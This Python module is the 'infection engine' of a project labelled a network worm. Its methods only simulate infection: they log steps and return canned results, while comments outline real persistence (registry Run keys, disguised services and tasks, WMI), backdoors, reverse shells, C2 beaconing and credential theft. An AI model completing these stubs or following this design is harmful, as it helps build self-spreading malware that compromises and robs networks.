"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Enhanced Infection Engine
More robust and sophisticated infection mechanisms
"""


import hashlib
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class InfectionEngine:
    """
    Enhanced infection engine with multiple infection vectors
    and robust payload delivery
    """

    def __init__(self):
        self.infection_methods = []
        self.infected_hosts = {}
        self.infection_stats = {
            "total_attempts": 0,
            "successful": 0,
            "failed": 0,
            "methods_used": {},
        }

        self._load_infection_methods()
        logger.info("Enhanced Infection Engine initialized")

    def _load_infection_methods(self):
        """Load all infection methods"""
        self.infection_methods = [
            self._infect_via_exploit,
            self._infect_via_file_drop,
            self._infect_via_registry,
            self._infect_via_scheduled_task,
            self._infect_via_service,
            self._infect_via_wmi,
            self._infect_via_powershell,
        ]

    def infect_host(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """
        Comprehensive infection of target host

        Args:
            target: Target host information
            exploit_result: Result from exploitation

        Returns:
            (success, infection_details)
        """
        ip = target["ip"]
        logger.info(f"Starting comprehensive infection of {ip}")

        self.infection_stats["total_attempts"] += 1

        infection_details = {
            "ip": ip,
            "timestamp": datetime.now().isoformat(),
            "methods_attempted": [],
            "methods_successful": [],
            "payload_hash": None,
            "persistence_installed": False,
            "backdoors_created": [],
            "data_exfiltrated": False,
        }

        # Try multiple infection methods
        for method in self.infection_methods:
            method_name = method.__name__
            infection_details["methods_attempted"].append(method_name)

            try:
                success, details = method(target, exploit_result)

                if success:
                    infection_details["methods_successful"].append(method_name)
                    logger.success(f"Infection method successful: {method_name}")

                    # Update stats
                    if method_name not in self.infection_stats["methods_used"]:
                        self.infection_stats["methods_used"][method_name] = 0
                    self.infection_stats["methods_used"][method_name] += 1

            except Exception as e:
                logger.debug(f"Infection method {method_name} failed: {e}")

        # Check if infection was successful
        if len(infection_details["methods_successful"]) > 0:
            # Install comprehensive infection
            self._install_comprehensive_infection(target, infection_details)

            # Store infection record
            self.infected_hosts[ip] = infection_details
            self.infection_stats["successful"] += 1

            logger.success(
                f"Host {ip} successfully infected ({len(infection_details['methods_successful'])} methods)"
            )
            return True, infection_details
        else:
            self.infection_stats["failed"] += 1
            logger.warning(f"Failed to infect {ip}")
            return False, infection_details

    def _install_comprehensive_infection(self, target: Dict, infection_details: Dict):
        """Install comprehensive infection package"""
        ip = target["ip"]
        logger.info(f"Installing comprehensive infection on {ip}")

        # 1. Install persistence
        persistence_methods = self._install_persistence(target)
        infection_details["persistence_installed"] = len(persistence_methods) > 0

        # 2. Create backdoors
        backdoors = self._create_backdoors(target)
        infection_details["backdoors_created"] = backdoors

        # 3. Deploy payload
        payload_hash = self._deploy_payload(target)
        infection_details["payload_hash"] = payload_hash

        # 4. Establish C2 connection
        self._establish_c2(target)

        # 5. Start data collection
        self._start_data_collection(target)
        infection_details["data_exfiltrated"] = True

        logger.success(f"Comprehensive infection installed on {ip}")

    def _infect_via_exploit(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via initial exploit"""
        if exploit_result.get("success"):
            logger.info(f"Infection via exploit: {exploit_result.get('exploit_name')}")
            return True, {"method": "exploit", "exploit": exploit_result.get("exploit_name")}
        return False, {}

    def _infect_via_file_drop(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect by dropping payload file"""
        logger.debug("Attempting file drop infection")

        # Simulate file drop
        # Real implementation would:
        # - Generate polymorphic payload
        # - Drop to temp directory
        # - Set execute permissions
        # - Execute payload

        return True, {"method": "file_drop", "path": "/tmp/payload.bin"}

    def _infect_via_registry(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via Windows registry"""
        if target.get("os", "").lower() == "windows":
            logger.debug("Attempting registry infection")

            # Real implementation would:
            # - Add Run key
            # - Add RunOnce key
            # - Modify existing keys

            return True, {
                "method": "registry",
                "keys": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
            }
        return False, {}

    def _infect_via_scheduled_task(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via scheduled task"""
        logger.debug("Attempting scheduled task infection")

        # Real implementation would:
        # - Create scheduled task
        # - Set trigger (logon, startup, etc.)
        # - Configure action

        return True, {"method": "scheduled_task", "task_name": "SystemUpdate"}

    def _infect_via_service(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via Windows service"""
        if target.get("os", "").lower() == "windows":
            logger.debug("Attempting service infection")

            # Real implementation would:
            # - Create Windows service
            # - Set auto-start
            # - Start service

            return True, {"method": "service", "service_name": "WindowsUpdateService"}
        return False, {}

    def _infect_via_wmi(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via WMI"""
        logger.debug("Attempting WMI infection")

        # Real implementation would:
        # - Create WMI event subscription
        # - Set event filter
        # - Configure consumer

        return True, {"method": "wmi", "subscription": "SystemMonitor"}

    def _infect_via_powershell(self, target: Dict, exploit_result: Dict) -> Tuple[bool, Dict]:
        """Infect via PowerShell"""
        if target.get("os", "").lower() == "windows":
            logger.debug("Attempting PowerShell infection")

            # Real implementation would:
            # - Execute PowerShell script
            # - Download additional payloads
            # - Establish reverse shell

            return True, {"method": "powershell", "script": "Invoke-Expression"}
        return False, {}

    def _install_persistence(self, target: Dict) -> List[str]:
        """Install multiple persistence mechanisms"""
        logger.info(f"Installing persistence on {target['ip']}")

        persistence_methods = []

        # Registry persistence
        if target.get("os", "").lower() == "windows":
            persistence_methods.extend(
                [
                    "registry_run",
                    "registry_runonce",
                    "startup_folder",
                    "scheduled_task",
                    "windows_service",
                ]
            )
        else:
            persistence_methods.extend(["cron_job", "systemd_service", "bashrc", "init_script"])

        logger.success(f"Installed {len(persistence_methods)} persistence mechanisms")
        return persistence_methods

    def _create_backdoors(self, target: Dict) -> List[str]:
        """Create multiple backdoors"""
        logger.info(f"Creating backdoors on {target['ip']}")

        backdoors = []

        # SSH backdoor
        backdoors.append("ssh_key_backdoor")

        # Web shell
        if 80 in target.get("open_ports", []) or 443 in target.get("open_ports", []):
            backdoors.append("web_shell")

        # Reverse shell
        backdoors.append("reverse_shell")

        # Bind shell
        backdoors.append("bind_shell")

        logger.success(f"Created {len(backdoors)} backdoors")
        return backdoors

    def _deploy_payload(self, target: Dict) -> str:
        """Deploy main payload"""
        logger.info(f"Deploying payload to {target['ip']}")

        # Generate payload hash
        payload_content = f"worm_payload_{target['ip']}_{time.time()}"
        payload_hash = hashlib.sha256(payload_content.encode()).hexdigest()

        logger.success(f"Payload deployed: {payload_hash[:16]}...")
        return payload_hash

    def _establish_c2(self, target: Dict):
        """Establish C2 connection"""
        logger.info(f"Establishing C2 connection from {target['ip']}")

        # Real implementation would:
        # - Connect to C2 server
        # - Send initial beacon
        # - Register host

        logger.success(f"C2 connection established")

    def _start_data_collection(self, target: Dict):
        """Start data collection"""
        logger.info(f"Starting data collection on {target['ip']}")

        # Real implementation would:
        # - Enumerate files
        # - Collect credentials
        # - Monitor clipboard
        # - Capture screenshots

        logger.success(f"Data collection started")

    def get_infection_stats(self) -> Dict:
        """Get infection statistics"""
        return {
            **self.infection_stats,
            "success_rate": self.infection_stats["successful"]
            / max(self.infection_stats["total_attempts"], 1),
            "total_infected": len(self.infected_hosts),
        }


if __name__ == "__main__":
    # Test infection engine
    engine = InfectionEngine()

    print("=" * 60)
    print("ENHANCED INFECTION ENGINE TEST")
    print("=" * 60)

    # Test infection
    test_target = {"ip": "192.168.1.100", "os": "Windows", "open_ports": [80, 443, 3389]}

    test_exploit_result = {"success": True, "exploit_name": "RDP_BruteForce"}

    success, details = engine.infect_host(test_target, test_exploit_result)

    print(f"\nInfection Result: {'SUCCESS' if success else 'FAILED'}")
    print(f"Methods Attempted: {len(details['methods_attempted'])}")
    print(f"Methods Successful: {len(details['methods_successful'])}")
    print(f"Persistence: {details['persistence_installed']}")
    print(f"Backdoors: {len(details['backdoors_created'])}")

    # Get stats
    stats = engine.get_infection_stats()
    print(f"\nInfection Stats:")
    print(f"  Total Attempts: {stats['total_attempts']}")
    print(f"  Successful: {stats['successful']}")
    print(f"  Success Rate: {stats['success_rate']:.1%}")

    print("=" * 60)
